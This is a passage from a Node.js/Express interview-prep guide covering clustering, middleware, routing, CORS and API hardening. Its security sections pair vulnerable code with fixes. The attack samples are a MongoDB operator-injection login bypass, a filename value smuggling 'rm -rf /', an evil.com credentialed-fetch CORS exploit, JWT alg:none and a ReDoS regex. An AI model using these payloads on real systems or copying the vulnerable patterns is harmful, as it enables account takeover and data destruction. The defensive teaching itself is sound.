| Mechanism | Isolation | Shares memory? | Best for |
|---|---|---|---|
| **Cluster** | Separate process, separate V8 heap | No (IPC via serialization) | Scaling HTTP throughput across cores |
| **Worker Threads** | Separate V8 isolate, same process | Yes, via `SharedArrayBuffer`/`transferList` | CPU-bound work (hashing, image resize, parsing) |
| **Child Process** | Fully separate program | No | Running external tools/binaries |

**Layered application architecture (what interviewers expect you to sketch):**

```text
Request
  → Router          (path/method matching)
  → Middleware       (auth, validation, rate-limit)
  → Controller       (parse request, call service, shape response)
  → Service          (business logic, orchestration)
  → Repository/DAO   (data access, ORM/query builder)
  → Database / Cache / External API
```

Keeping controllers thin and business logic in services is what makes the app testable — you can unit-test services without spinning up Express.

#### Trade-offs

| Approach | Advantage | Disadvantage |
|---|---|---|
| Cluster module | Full CPU utilization, process crash isolation | No shared memory; sticky sessions needed for WebSockets/in-memory sessions |
| Worker Threads | Shared memory, cheaper than child process | Still bounded by CPU core count; complexity in message passing |
| Monolith | Simple deploy, easy transactions, low latency between modules | Harder to scale teams/parts independently; one bug can take down everything |
| Microservices | Independent scaling & deploys, fault isolation | Network latency, distributed transactions, operational overhead (service mesh, tracing) |

#### Common Mistakes

**1. Running CPU-bound work on the main thread:**

```javascript
// BAD — blocks the event loop for every other request
app.post('/resize', (req, res) => {
  const resized = heavySyncImageResize(req.body.image); // blocks 500ms+
  res.json(resized);
});

// GOOD — offload to a worker thread or a queue-backed microservice
app.post('/resize', async (req, res) => {
  const result = await runInWorker('./resize-worker.js', req.body.image);
  res.json(result);
});
```

**2. Assuming Cluster shares in-memory state:**

```javascript
// BAG — each cluster worker has its OWN copy of this Map
const sessions = new Map(); // worker 1's map ≠ worker 2's map
// A user's request can land on a different worker each time (round-robin)
// and their session "disappears"

// FIX — externalize shared state to Redis
const session = await redisClient.get(`session:${userId}`);
```

**3. Forgetting `UV_THREADPOOL_SIZE` is a shared, fixed resource:**

```javascript
// If you do 20 concurrent bcrypt.hash() calls, only 4 run at a time by default
// (bcrypt uses the same libuv thread pool as fs and dns.lookup)
// Increase pool size for I/O/crypto-heavy apps:
process.env.UV_THREADPOOL_SIZE = 16; // must be set before any thread-pool op runs
```

#### Follow-up Questions

1. How does the Cluster module load-balance connections across workers? *(Linux: OS-level round-robin via shared socket (SO_REUSEPORT-like); Node's own round-robin scheduler on other platforms)*
2. Why can't WebSocket connections be load-balanced across Cluster workers without extra work? *(sticky sessions + a shared pub/sub layer like Redis for socket.io)*
3. When would you choose Worker Threads over spinning up a separate microservice for CPU-bound work?
4. How does V8's garbage collector affect a long-running Node process's latency (GC pauses)?
5. How do you graceful-shutdown a clustered Node app during a deploy? *(SIGTERM handler, drain connections, `server.close()`, health check flips before kill)*

#### Real Production Example

At a Walmart-scale checkout service, a single Node process was handling both API traffic and on-demand PDF invoice generation. Under Black-Friday-level load, PDF generation (CPU-bound, ~300ms per invoice) was blocking the event loop, causing P99 API latency to spike from 50ms to 4000ms and triggering cascading timeouts upstream.

```javascript
// BEFORE — PDF generation blocks the shared event loop
app.get('/invoice/:id', async (req, res) => {
  const pdf = generatePdfSync(order); // 300ms of pure CPU, blocks everything
  res.type('pdf').send(pdf);
});

// AFTER — dedicated worker pool + queue, main event loop stays free
app.get('/invoice/:id', async (req, res) => {
  const jobId = await pdfQueue.add({ orderId: req.params.id }); // BullMQ + Redis
  res.json({ jobId, statusUrl: `/invoice/status/${jobId}` });
});
// Separate worker process consumes the queue, isolated from API traffic
```

**Fix applied:** Moved PDF generation to a dedicated worker pool consuming a Redis-backed queue (BullMQ), decoupling it entirely from the request-handling process. P99 API latency returned to 45ms under the same load.

#### Performance Considerations

- Profile with `clinic.js doctor` to spot event-loop-blocking code paths
- `perf_hooks.monitorEventLoopDelay()` in production — alert if p99 event loop delay > 10ms
- Increase `UV_THREADPOOL_SIZE` for apps heavy on `fs`/`crypto`/`zlib`, but remember it's a shared, process-wide resource
- Avoid `JSON.parse`/`JSON.stringify` on very large payloads on the hot path — it's synchronous and O(n) blocking

#### Scalability Considerations

- Keep the app **stateless** — externalize sessions, caches, and rate-limit counters to Redis so any instance can serve any request
- Run behind a load balancer with health checks (`/healthz`) and graceful shutdown (drain in-flight requests on SIGTERM before exiting)
- Horizontal scaling (more instances/pods) is almost always preferable to vertical scaling for I/O-bound Node apps — Kubernetes HPA on CPU/latency metrics
- Use a process manager (PM2 cluster mode, or Kubernetes replicas) rather than hand-rolling `cluster.fork()` logic in most production setups

> **Interviewer Note:** A candidate who distinguishes the thread pool from OS-level async I/O, and who can sketch a layered architecture plus a real scaling fix, is at Senior/Staff level.

---

### Q20 — Express Middleware: Types, Execution Order, and Error Handling

*Asked at: Amazon · Microsoft · Adobe*

#### Why Interviewers Ask This

Middleware is the backbone of every Express (and most Node framework) request lifecycle. Interviewers use this to check whether you understand the request pipeline as a chain of function calls — not magic — and whether you know the single most common cause of hung requests in production: an async middleware that throws without calling `next(err)`.

#### Beginner Answer

> "Middleware are functions that run between the request and the response. You call `next()` to pass control to the next one."

**Score: 3 / 10 — Correct but misses middleware types, ordering rules, and async error handling entirely**

#### Senior Engineer Answer

Express is fundamentally a **chain of functions**, each with the signature `(req, res, next)`. The request flows through the stack in the exact order middleware was registered.

```text
Request
   │
   ▼
┌─────────────┐   ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
│  helmet()   │──▶│  cors()     │──▶│ express.json│──▶│  authMw()   │──▶ route handler
└─────────────┘   └─────────────┘   └─────────────┘   └─────────────┘
       │                  │                 │                 │
       ▼                  ▼                 ▼                 ▼
   sets headers     sets CORS         parses JSON       verifies JWT,
                    headers           body → req.body    sets req.user

If any middleware calls next(err) instead of next() → jumps straight to
the error-handling middleware (4-arg signature), skipping everything else.
```

**Middleware categories:**

```javascript
// 1. Application-level — runs for every request (or a path prefix)
app.use(express.json());
app.use('/api', apiRouter);

// 2. Router-level — scoped to a specific router instance
const router = express.Router();
router.use(authMiddleware); // only applies to routes on this router

// 3. Built-in — shipped with Express
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

// 4. Third-party
app.use(helmet());
app.use(morgan('combined'));
app.use(cors());

// 5. Error-handling — MUST have exactly 4 params; Express detects this by arity
app.use((err, req, res, next) => {
  logger.error(err);
  res.status(err.statusCode || 500).json({ message: err.message || 'Internal error' });
});
```

> **Key mechanism:** Express checks `fn.length` — if a middleware function has exactly 4 parameters, it's registered as error-handling middleware and is skipped during normal flow, only invoked via `next(err)`.

**The async error-handling trap — the #1 Express production bug:**

```javascript
// BAD — Express 4's error handling does NOT catch rejected promises
app.get('/user/:id', async (req, res) => {
  const user = await db.findUser(req.params.id); // throws — findUser rejects
  res.json(user);
  // If db.findUser() rejects, this becomes an UNHANDLED REJECTION.
  // The request hangs forever — no response sent, no error middleware triggered.
});

// FIX 1 — manual try/catch with next(err)
app.get('/user/:id', async (req, res, next) => {
  try {
    const user = await db.findUser(req.params.id);
    res.json(user);
  } catch (err) {
    next(err); // routes to error middleware
  }
});

// FIX 2 — a wrapper utility (avoids repeating try/catch everywhere)
const asyncHandler = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
app.get('/user/:id', asyncHandler(async (req, res) => {
  const user = await db.findUser(req.params.id);
  res.json(user);
}));

// FIX 3 — Express 5 (2024+) auto-forwards rejected promises to next() natively
```

**Centralized error handler distinguishing operational vs. programmer errors:**

```javascript
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true; // expected error (bad input, not found, etc.)
  }
}

app.use((err, req, res, next) => {
  if (err.isOperational) {
    return res.status(err.statusCode).json({ message: err.message });
  }
  // Unexpected/programmer error — don't leak internals to the client
  logger.error('UNEXPECTED ERROR', err);
  res.status(500).json({ message: 'Something went wrong' });
});
```

#### Trade-offs

| Approach | Advantage | Disadvantage |
|---|---|---|
| Manual try/catch per route | Explicit, no magic | Repetitive boilerplate across dozens of routes |
| `asyncHandler` wrapper | DRY, consistent error routing | One more abstraction devs must learn/remember to use |
| Express 5 native async support | Zero boilerplate | Still maturing adoption; many codebases pinned to Express 4 |
| Fat middleware chains | Reusable cross-cutting concerns | Every added middleware adds latency; hard to trace order-dependent bugs |

#### Common Mistakes

**1. Placing error-handling middleware before routes:**

```javascript
// BAD — error handler registered before routes never gets reached correctly
app.use(errorHandler);
app.use('/api', apiRouter);

// GOOD — error handler must be LAST
app.use('/api', apiRouter);
app.use(errorHandler);
```

**2. Calling `next()` after already sending a response:**

```javascript
app.get('/data', (req, res, next) => {
  res.json({ ok: true });
  next(); // BUG — "Cannot set headers after they are sent to the client"
});
```

**3. Forgetting body-parser must run before routes that read `req.body`:**

```javascript
app.post('/login', (req, res) => {
  console.log(req.body); // undefined if express.json() wasn't registered first
});
app.use(express.json()); // too late — registered AFTER the route
```

#### Follow-up Questions

1. How does Express decide whether a middleware is error-handling or normal? *(function arity — `fn.length === 4`)*
2. What happens if you call `next()` twice in the same middleware?
3. How would you write middleware that only applies to a subset of routes matching a pattern?
4. How does Express 5 change async error handling compared to Express 4?
5. How would you implement request-scoped context (e.g., a request ID for logging) using middleware? *(AsyncLocalStorage or attaching to `req`)*

#### Real Production Example

An Adobe-scale API had an async route handler that called an external payment gateway. When the gateway timed out, the promise rejected, but there was no try/catch and no `asyncHandler`. The request never got a response — it hung until the client's own timeout (30s), and the connection stayed open the whole time. Under load, this exhausted the server's available sockets, causing a full outage that looked like "the server is down" when it was actually alive but starved of connections.

**Fix applied:** Wrapped every async route with `asyncHandler`, added a global `unhandledRejection` process listener as a safety net (logs + triggers alerting), and added a request-level timeout middleware (`connect-timeout`) that calls `next(new AppError('Gateway timeout', 504))` if a request exceeds 10s.

#### Performance Considerations

- Every middleware in the chain adds latency — measure with `response-time` middleware and trim unused ones
- Avoid synchronous, CPU-heavy work inside middleware (e.g., full-payload deep validation with backtracking regex) — see ReDoS in the Security question below
- Order matters for short-circuiting: put cheap checks (auth token presence) before expensive ones (DB-backed permission checks)

#### Scalability Considerations

- Rate-limiting middleware must use a shared store (Redis) across instances — an in-memory counter only limits requests hitting that one process
- Centralize cross-cutting middleware (auth, rate limiting, logging) at an API gateway layer when running microservices, to avoid duplicating and drifting logic across services
- Use `AsyncLocalStorage` (Node 14+) for request-scoped context (trace IDs, tenant IDs) instead of manually threading `req` through every function call

> **Interviewer Note:** A candidate who explains the 4-arg error-middleware detection mechanism and the async rejection trap (with a wrapper fix) is at Senior level.

---

### Q21 — Routing in Express: Matching Internals, Router Composition, and Versioning

*Asked at: Amazon · Google · Uber*

#### Why Interviewers Ask This

Routing looks trivial until an API grows to hundreds of endpoints and a subtle ordering bug makes a route unreachable. This question checks whether you understand route matching order, modular `Router()` composition, and how to structure/version a large API — all real architecture decisions, not just syntax.

#### Beginner Answer

> "You define routes with `app.get()`, `app.post()`, etc., and Express calls the matching handler."

**Score: 3 / 10 — No mention of matching order, Router composition, or versioning strategy**

#### Senior Engineer Answer

Express compiles each registered path into a regular expression (via the `path-to-regexp` library) and tests incoming requests **in registration order, top to bottom** — the first matching layer wins for that step of the chain (middleware can still call `next()` to fall through to the next match).

```javascript
// Route registration order literally determines match order
app.get('/users/me', getCurrentUser);     // must come FIRST
app.get('/users/:id', getUserById);        // this would otherwise "eat" /users/me

// If reversed: a request to GET /users/me matches /users/:id first,
// with req.params.id === 'me' — wrong handler, likely a DB lookup crash
```

**`Router()` — modular, mountable mini-applications:**

```javascript
// routes/users.js
const router = express.Router();
router.use(requireAuth);              // scoped to this router only
router.get('/', listUsers);
router.get('/:id', getUser);
router.post('/', createUser);
module.exports = router;

// app.js
app.use('/api/v1/users', require('./routes/users'));
// Inside the router, paths are relative to the mount point
// GET /api/v1/users/42 → router receives it as GET /42
```

**Route parameter validation with `router.param()` — DRY param handling:**

```javascript
router.param('id', async (req, res, next, id) => {
  if (!mongoose.isValidObjectId(id)) {
    return next(new AppError('Invalid ID format', 400));
  }
  next();
});
// Now every route with :id on this router gets validated automatically
router.get('/:id', getUser);
router.delete('/:id', deleteUser);
```

**Versioning strategies — trade-offs matter here:**

```javascript
// 1. URI versioning — most common, cache-friendly, explicit
app.use('/api/v1/users', usersV1Router);
app.use('/api/v2/users', usersV2Router);

// 2. Header versioning — cleaner URLs, harder to test/debug/curl
app.use('/api/users', (req, res, next) => {
  req.apiVersion = req.headers['accept-version'] || 'v1';
  next();
}, usersRouter);

// 3. Query param versioning — rare, mostly for gradual rollout/testing
// GET /api/users?version=2
```

| Strategy | Advantage | Disadvantage |
|---|---|---|
| URI (`/v1/...`) | Explicit, cacheable, easy to route at gateway/CDN level | URL "pollution", duplicate route trees over time |
| Header (`Accept-Version`) | Clean URLs, RESTful purity | Harder to test in browser/curl, invisible in logs/analytics |
| Query param | Simple for gradual feature rollout | Not idiomatic REST, easy to forget/misuse |

#### Trade-offs

| Approach | Advantage | Disadvantage |
|---|---|---|
| Flat route files (`app.get` everywhere) | Simple for tiny APIs | Unmanageable past ~20 routes |
| `Router()` per resource | Modular, testable, scoped middleware | Requires discipline on mount-point naming |
| Controller layer separate from routes | Thin routes, testable business logic | One more file/layer to navigate |
| Regex/wildcard routes | Flexible matching | Hard to read, easy to create unintended overlaps |

#### Common Mistakes

**1. Dynamic route shadowing a static one:**

```javascript
// BUG — /products/featured never reached
router.get('/:id', getProduct);
router.get('/featured', getFeaturedProducts); // unreachable — :id matches "featured" first

// FIX — order static/specific routes before dynamic ones
router.get('/featured', getFeaturedProducts);
router.get('/:id', getProduct);
```

**2. Not validating `:id` before hitting the database:**

```javascript
// BUG — a non-numeric/invalid id crashes the query or returns a confusing 500
router.get('/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
});
// FIX — validate format (see router.param example above) and return 400 early
```

**3. Forgetting router-level middleware only applies to routes registered *after* it:**

```javascript
router.get('/public', publicHandler);   // NOT protected
router.use(requireAuth);                // applies only below this line
router.get('/private', privateHandler); // protected
```

#### Follow-up Questions

1. How does `path-to-regexp` turn `/users/:id` into a regular expression, and how do optional (`:id?`) and wildcard (`*`) params affect it?
2. How would you implement API versioning that lets you deprecate v1 gradually while both versions run simultaneously?
3. How do you unit-test a Router in isolation without booting the full Express app? *(supertest against just that router mounted on a fresh `express()` instance)*
4. What's the performance impact of having thousands of registered routes, and how would you mitigate it? *(nested routers by prefix reduce regex tests per request)*
5. How would you implement route-level rate limiting different from the global rate limit?

#### Real Production Example

At a Google-Cloud-adjacent internal tool, a new engineer added `GET /reports/:reportId` to fetch a report by ID. Two days later, the existing `GET /reports/summary` endpoint (aggregated dashboard data) started returning 500s intermittently. Root cause: the new dynamic route was registered *before* the existing static route, so requests to `/reports/summary` matched `:reportId = "summary"`, which then failed a DB lookup expecting a UUID.

**Fix applied:** Reordered static routes above dynamic ones, added an integration test asserting `/reports/summary` returns the aggregate shape (not a 404/500), and added a lightweight lint script that flags any router where a `:param` route is registered before a static sibling path.

#### Performance Considerations

- Group routes under `Router()` by resource/prefix so Express can short-circuit non-matching prefixes early rather than testing every route's full regex
- Avoid excessively broad wildcard routes (`app.use('*', ...)`) high in the middleware stack — every request pays the regex-test cost
- Cache compiled route regexes are already handled internally by Express — the main cost you control is *how many* routes/middleware a request must traverse before matching

#### Scalability Considerations

- At API-gateway scale, route versioning and deprecation policy should be centrally documented and enforced (e.g., sunset headers, deprecation warnings in response headers)
- Split large monolithic route trees into per-domain Routers owned by different teams, composed at the top level — mirrors a "modular monolith" that can later be extracted into microservices with minimal rewrite
- For very high route counts (1000s), consider a radix-tree-based router (e.g., `find-my-way`, used by Fastify) which offers better asymptotic matching performance than Express's linear middleware-stack scan

> **Interviewer Note:** A candidate who catches the static-vs-dynamic route ordering bug from a real scenario and can articulate URI vs. header versioning trade-offs is at Senior level.

---

### Q22 — CORS: Same-Origin Policy, Preflight Requests, and Secure Configuration

*Asked at: Amazon · Microsoft · Salesforce*

#### Why Interviewers Ask This

CORS misconfiguration is one of the most common real-world security bugs in Node/Express APIs, and most developers "fix" CORS errors by copy-pasting `app.use(cors())` without understanding what they just disabled. This question checks whether you understand CORS as a **browser-enforced** protocol (not a server-side security boundary) and whether you can spot a dangerous configuration.

#### Beginner Answer

> "CORS is a browser restriction on calling APIs from a different domain. You fix CORS errors by adding the `cors` npm package and setting `Access-Control-Allow-Origin`."

**Score: 3 / 10 — True but shallow; doesn't explain preflight, credentials, or the actual security implications**

#### Senior Engineer Answer

**Same-Origin Policy (SOP)** is a browser security mechanism: a script running on `https://a.com` cannot read the response of a request to `https://b.com` unless `b.com` explicitly opts in via CORS headers. Two origins match only if scheme, host, **and** port are all identical.

> **Critical nuance interviewers listen for:** CORS does not stop the request from reaching the server (except when a preflight fails). The server still executes a simple GET/POST — CORS only controls whether the **browser hands the response back to the calling JavaScript**. This is why CORS is not a defense against CSRF, and why you'll see the request succeed server-side (e.g., in your logs/DB) even though the browser console shows a CORS error.

**Simple requests vs. preflighted requests:**

```text
SIMPLE request (no preflight) — sent directly:
  - Method: GET, HEAD, or POST
  - Only "CORS-safelisted" headers (Accept, Accept-Language, Content-Type)
  - Content-Type limited to: application/x-www-form-urlencoded,
    multipart/form-data, or text/plain

PREFLIGHTED request — browser sends an OPTIONS request FIRST:
  - Method: PUT, DELETE, PATCH, or custom methods
  - Custom headers (Authorization, X-Custom-Header)
  - Content-Type: application/json  ← this alone triggers preflight!
```

```text
Preflight flow:

Browser                                Server
   │  OPTIONS /api/users                  │
   │  Origin: https://app.example.com     │
   │  Access-Control-Request-Method: PUT  │
   │  Access-Control-Request-Headers:     │
   │    content-type, authorization       │
   │─────────────────────────────────────▶│
   │                                       │
   │  200 OK                              │
   │  Access-Control-Allow-Origin:        │
   │    https://app.example.com           │
   │  Access-Control-Allow-Methods:       │
   │    GET, POST, PUT, DELETE            │
   │  Access-Control-Allow-Headers:       │
   │    content-type, authorization       │
   │  Access-Control-Max-Age: 86400       │
   │◀─────────────────────────────────────│
   │                                       │
   │  PUT /api/users/42  (actual request)│
   │─────────────────────────────────────▶│
```

**Credentials (cookies, Authorization headers) require explicit configuration:**

```javascript
const cors = require('cors');

// SAFE — explicit origin allowlist, required when using credentials
const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,           // allows cookies/Authorization header
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  maxAge: 86400,                // cache preflight for 24h — fewer OPTIONS round-trips
}));

// NOTE: Access-Control-Allow-Origin CANNOT be '*' when credentials: true —
// the browser will reject the response outright. Must be an explicit origin.
```

#### Trade-offs

| Approach | Advantage | Disadvantage |
|---|---|---|
| Wildcard `origin: '*'` | Zero config, works for any client | Cannot be combined with credentials; exposes API to any website's JS |
| Explicit allowlist | Secure, precise control | Must maintain the list; breaks for legitimate new clients until added |
| Reflect any origin (`origin: true`) | "Just works" for every caller | Functionally equivalent to `*` but also works WITH credentials — dangerous |
| CORS at API gateway/proxy | Single source of truth across microservices | Extra hop to reason about; must stay in sync with backend auth model |

#### Common Mistakes

**1. Reflecting the request's Origin header with credentials enabled — a real vulnerability:**

```javascript
// DANGEROUS — this "reflects" whatever Origin the browser sends, effectively
// disabling the same-origin protection while still allowing cookies
app.use(cors({
  origin: (origin, cb) => cb(null, origin), // accepts ANY origin
  credentials: true,
}));
// An attacker's site (evil.com) can now do:
// fetch('https://api.example.com/me', { credentials: 'include' })
// and READ the authenticated response — full account takeover potential
```

**2. Forgetting `Vary: Origin` when caching responses (CDN/reverse proxy):**

```javascript
// Without Vary: Origin, a CDN might cache the CORS headers computed for
// origin A's request and serve them to origin B — leaking access
res.setHeader('Vary', 'Origin'); // cors middleware sets this automatically
```

**3. Believing CORS protects against CSRF:**

```text
CORS controls whether JS can READ a cross-origin response.
It does NOT stop a <form> POST or an <img src> GET-with-side-effects —
those aren't subject to CORS at all (no JS reads the response).
CSRF defense = SameSite cookies + CSRF tokens, NOT CORS headers.
```

#### Follow-up Questions

1. Why can't you use `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`?
2. What triggers a preflight request versus a simple request — list the exact conditions.
3. How does `Access-Control-Max-Age` interact with browser-enforced caps (Chrome caps it at 2 hours regardless of the header value)?
4. Why is CORS not a CSRF defense, and what actually prevents CSRF?
5. How would you configure CORS differently for a public read-only API versus an authenticated internal API?

#### Real Production Example

A Salesforce-scale internal admin dashboard used cookie-based session auth and had CORS configured as `cors({ origin: true, credentials: true })` "to unblock the frontend team quickly." A security audit found that any external website could craft a page with `fetch('https://internal-api.company.com/admin/users', { credentials: 'include' })`, and because the API reflected any Origin while allowing credentials, the attacker's page could read the full response — a cross-site data exfiltration vulnerability affecting any logged-in admin who visited the malicious page.

**Fix applied:** Replaced the reflect-any-origin config with an explicit allowlist of the two legitimate frontend origins, added `SameSite=Strict` to session cookies as defense-in-depth, and added a CSP header restricting which origins the admin dashboard's own pages could load scripts from.

#### Performance Considerations

- Set `Access-Control-Max-Age` to cache preflight responses and avoid a round-trip OPTIONS request before every PUT/DELETE/JSON POST
- Terminate CORS handling at the reverse proxy/API gateway layer for microservices to avoid every service repeating the same preflight logic
- Ensure caching layers (CDN, `Cache-Control`) include `Vary: Origin` so cached CORS headers aren't leaked across different calling origins

#### Scalability Considerations

- Centralize the origin allowlist as configuration (env var/config service), not hardcoded — new frontend deployments (staging, preview URLs) shouldn't require a code change and redeploy
- For multi-tenant SaaS with customer-specific subdomains, validate origins against a pattern/allowlist stored per-tenant rather than a single global list
- Document CORS policy alongside API versioning — changing allowed methods/headers is a breaking change for existing clients

> **Interviewer Note:** A candidate who explains that CORS is browser-enforced (not a server security boundary), catches the reflect-origin-with-credentials vulnerability, and correctly states CORS ≠ CSRF protection is operating at Senior/Staff level.

---

### Q23 — Node.js / API Security: Injection, JWT Pitfalls, Rate Limiting, and Hardening Checklist

*Asked at: Amazon · Microsoft · Uber · Salesforce*

#### Why Interviewers Ask This

Security questions separate candidates who ship features from candidates who are trusted to own a production API. This is typically asked as an open-ended "how would you secure this Node/Express API" — interviewers are grading breadth (do you know the categories of risk) and depth (can you show the actual vulnerable code and the fix) simultaneously.

#### Beginner Answer

> "I'd use HTTPS, validate user input, and add the `helmet` package for security headers."

**Score: 3 / 10 — All true, but far too shallow for a senior security discussion; no mention of injection classes, JWT pitfalls, or rate limiting**

#### Senior Engineer Answer

A senior answer walks through a **checklist with concrete vulnerable/fixed code** for each category:

**1. Security headers (`helmet`):**

```javascript
const helmet = require('helmet');
app.use(helmet()); // sets HSTS, X-Content-Type-Options, X-Frame-Options, etc. by default
app.use(helmet.contentSecurityPolicy({
  directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] },
}));
```

**2. NoSQL injection (MongoDB operator injection) — very common, very missed:**

```javascript
// VULNERABLE — attacker sends { "password": { "$ne": null } } as JSON body
app.post('/login', async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password, // if this is an object, Mongo treats it as an operator query!
  });
  // { "$ne": null } matches ANY password that is not null — auth bypass
});

// FIXED — sanitize + enforce types with a schema validator
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // strips keys starting with '$' or containing '.'

const { z } = require('zod');
const loginSchema = z.object({ email: z.string().email(), password: z.string().min(8) });
app.post('/login', async (req, res) => {
  const { email, password } = loginSchema.parse(req.body); // throws if not plain strings
  const user = await User.findOne({ email });
  const valid = user && await bcrypt.compare(password, user.passwordHash);
});
```

**3. SQL injection — always parameterize, never concatenate:**

```javascript
// VULNERABLE
db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);

// FIXED — parameterized query
db.query('SELECT * FROM users WHERE email = ?', [req.body.email]);
```

**4. Command injection — never pass user input to a shell:**

```javascript
// VULNERABLE — attacker sends filename = "a.txt; rm -rf /"
const { exec } = require('child_process');
exec(`convert ${req.body.filename} output.png`); // shell interprets ; and &&

// FIXED — execFile/spawn with an args array, no shell interpretation
const { execFile } = require('child_process');
execFile('convert', [req.body.filename, 'output.png']);
```

**5. JWT pitfalls:**

```javascript
// VULNERABLE — "alg: none" / algorithm confusion attack
jwt.verify(token, secret); // no algorithms restriction — attacker can craft alg:none token

// FIXED — explicitly restrict accepted algorithms
jwt.verify(token, secret, { algorithms: ['HS256'] });

// Storage: prefer httpOnly, Secure, SameSite cookies over localStorage
// localStorage is readable by any injected script (XSS) — httpOnly cookies are not
res.cookie('token', jwt, { httpOnly: true, secure: true, sameSite: 'strict' });

// Short-lived access token (~15 min) + refresh token pattern, with the
// refresh token stored server-side (or rotated) so it can be revoked
```

**6. Rate limiting / brute-force protection (must be shared across instances):**

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

app.use('/login', rateLimit({
  store: new RedisStore({ client: redisClient }), // shared across all instances
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 min per IP
  message: 'Too many login attempts, try again later',
}));
```

**7. ReDoS (Regular Expression Denial of Service):**

```javascript
// VULNERABLE — catastrophic backtracking on crafted input like "aaaaaaaaaaaaaaaaaaaaaaaaa!"
const regex = /^(a+)+$/;
if (regex.test(userInput)) { ... } // can hang the event loop for minutes

// FIXED — avoid nested quantifiers; use a vetted library (safe-regex) to lint patterns,
// or set an execution timeout via a worker thread for untrusted regex evaluation
```

**8. Dependency/supply-chain security:**

```bash
npm audit --production          # check for known CVEs in dependencies
npm ci                          # install exactly from lockfile, no surprise upgrades
# Use Dependabot/Snyk for automated PRs on vulnerable dependencies
# Avoid installing packages with postinstall scripts you haven't reviewed
```

#### Trade-offs

| Control | Advantage | Disadvantage |
|---|---|---|
| Schema validation (Zod/Joi) on every input | Rejects malformed/malicious payloads at the boundary | Upfront cost to define schemas for every endpoint |
| httpOnly cookies for JWT | Immune to XSS token theft | Vulnerable to CSRF unless paired with SameSite/CSRF tokens |
| Redis-backed rate limiting | Consistent across all instances | Adds a dependency + latency (~1ms) per request |
| Strict CSP headers | Strong XSS mitigation | Can break third-party scripts/widgets if not carefully scoped |

#### Common Mistakes

**1. Trusting the shape of `req.body` without validation:**

```javascript
// Any field could be an object, array, or unexpected type — always validate types
if (req.body.password === storedPassword) { ... } // breaks if password is an object
```

**2. Logging sensitive data:**

```javascript
// BAD — passwords/tokens end up in log aggregators, visible to anyone with log access
logger.info(`Login attempt: ${JSON.stringify(req.body)}`);
// FIX — redact sensitive fields before logging
```

**3. Leaking stack traces in production error responses:**

```javascript
// BAD
app.use((err, req, res, next) => res.status(500).json({ stack: err.stack }));
// FIX — generic message in prod, full detail only in server-side logs
res.status(500).json({ message: process.env.NODE_ENV === 'production' ? 'Internal error' : err.message });
```

#### Follow-up Questions

1. How does algorithm confusion (RS256 → HS256) work as a JWT attack, and how do you prevent it?
2. Why is `express-mongo-sanitize` not sufficient on its own — what else should accompany it? *(schema validation, principle of least privilege on DB user)*
3. How would you implement token revocation for a stateless JWT-based auth system?
4. What's the difference between authentication and authorization vulnerabilities — give an example of each in an Express app (broken auth vs. IDOR/broken object-level authorization).
5. How would you defend against a ReDoS attack on a public-facing search endpoint?

#### Real Production Example

A Uber-scale internal service accepted login payloads and queried MongoDB directly with `req.body` fields without sanitization or schema validation. A penetration test found that sending `{ "email": "admin@company.com", "password": { "$gt": "" } }` bypassed authentication entirely — `$gt: ""` matches any non-empty string, so the query matched the admin's document regardless of the actual password.

**Fix applied:** Added `express-mongo-sanitize` globally to strip `$`-prefixed keys, added Zod schema validation on every auth endpoint enforcing `password` must be a string, and added an automated security regression test suite (`npm audit` + custom injection payloads) run in CI on every PR touching auth code.

#### Performance Considerations

- Schema validation (Zod/Joi) adds microseconds per request — negligible compared to the cost of a successful injection attack
- Redis-backed rate limiting adds ~1ms latency per request but is required for correctness across multiple instances — an in-memory-only limiter is trivially bypassed by hitting a different instance
- `bcrypt`/`argon2` password hashing is intentionally slow (by design, to resist brute force) — always run it via the libuv thread pool (default, non-blocking) rather than a sync variant on the main thread

#### Scalability Considerations

- Push common security controls (rate limiting, WAF rules, TLS termination) to an API gateway/reverse proxy shared across all microservices, so every new service inherits baseline protection
- Rotate secrets (JWT signing keys, DB credentials) via a secrets manager (AWS Secrets Manager/Vault) with zero-downtime rotation support, not hardcoded env vars checked into config
- As the system grows to multiple services, adopt short-lived, narrowly-scoped service-to-service tokens (mTLS or signed JWTs with tight audience claims) instead of one shared API key everywhere — limits blast radius of any single leaked credential

> **Interviewer Note:** A candidate who can produce vulnerable-code-then-fix pairs for at least three injection classes (NoSQL, SQL, command) plus a coherent JWT security model is at Senior/Staff level. Mentioning ReDoS and ties back to event-loop blocking (Q1) shows Principal-level systems thinking.

---

## Topic 03 — Production Architecture & Deployment

---

### Q24 — Design the Production Deployment Architecture for a MERN Application

*Asked at: Amazon · Microsoft · Walmart · Atlassian*

#### Why Interviewers Ask This

"It works on my machine" is where junior engineers stop. This question tests whether you can take a MERN app from `npm start` to a production topology that survives instance crashes, traffic spikes, and deploys without dropping requests. Interviewers listen for the full path of a request — DNS to CDN to load balancer to app to database — and for zero-downtime deployment strategy.

#### Beginner Answer

> "I'd deploy the Node server on EC2 or Heroku, put the React build on the same server, and use MongoDB Atlas for the database. PM2 keeps the server running."

**Score: 3 / 10 — A single instance with no load balancing, no CDN, no deploy strategy, no failure isolation**

#### Senior Engineer Answer

The reference production topology for a MERN application:

```text
                        ┌──────────────┐
   User ──▶ DNS ──▶     │  CDN          │  ← React static build (S3/CloudFront,
            (Route53)   │  (CloudFront) │    Vercel, Cloudflare) — cached at edge
                        └──────┬───────┘
                               │  /api/* only
                               ▼
                        ┌──────────────┐
                        │ Load Balancer │  ← TLS termination, health checks,
